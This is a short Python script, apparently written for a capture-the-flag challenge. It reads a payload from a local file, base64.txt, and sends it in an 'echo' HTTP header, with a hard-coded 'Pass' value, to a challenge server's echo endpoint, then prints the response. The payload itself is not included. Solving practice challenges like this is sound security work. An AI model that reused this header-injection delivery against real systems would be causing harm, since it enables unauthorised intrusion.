import requests


url = "http://challenge.imxbt.cn:32521/api/echo"

with open("base64.txt", "r") as f:
    payload = f.read()

HEADERS = {
    "Pass": "mPght",
    "echo": payload
}

PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def send():
    resp = requests.get(url=url, headers=HEADERS)
    print(resp.content)
    print(resp.status_code)
    print(resp.headers)

def main():
    send()

if __name__ == '__main__':
    main()